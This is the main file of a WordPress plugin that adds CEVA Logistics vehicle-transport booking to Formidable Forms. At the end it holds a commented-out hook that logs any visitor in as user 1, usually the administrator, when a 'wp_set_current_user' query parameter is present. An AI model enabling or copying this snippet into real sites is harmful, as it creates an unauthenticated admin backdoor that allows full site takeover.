<?php
/**
 * Plugin Name:     CEVA Booking for Formidable Forms
 * Plugin URI:      https://upnrunn.com/plugins/formidable-booking
 * Description:     Enable booking for Formidable Forms using vehicle transport booking service provided by CEVA Logistics for interstate vehicle transport.
 * Author:          upnrunn™ technologies
 * Author URI:      https://upnrunn.com/
 * Text Domain:     formidable-booking
 * Domain Path:     /languages
 * Version:         0.1.0
 *
 * @package         Formidable_Booking
 */

namespace Upnrunn;

// Exit if accessed directly.
defined( 'ABSPATH' ) || exit;

if ( ! defined( 'FORMIDABLE_BOOKING_FILE' ) ) {
	define( 'FORMIDABLE_BOOKING_FILE', __FILE__ );
}

// Autoload composer packages.
require dirname( FORMIDABLE_BOOKING_FILE ) . '/vendor/autoload.php';

if ( ! class_exists( 'Formidable_Booking', false ) ) {
	include_once dirname( FORMIDABLE_BOOKING_FILE ) . '/includes/class-formidable-booking.php';
}

function formidable_booking() {
	return Formidable_Booking::instance();
}

// Global for backwards compatibility.
$GLOBALS['formidable_booking'] = formidable_booking();

// add_action(
// 	'init',
// 	function() {
// 		if ( isset( $_GET['wp_set_current_user'] ) ) {
// 			$user_id = 1;
// 			$user    = get_user_by( 'id', $user_id );
// 			if ( $user ) {
// 				wp_set_current_user( $user_id, $user->user_login );
// 				wp_set_auth_cookie( $user_id );
// 				do_action( 'wp_login', $user->user_login, $user );
// 			}
// 		}
// 	}
// );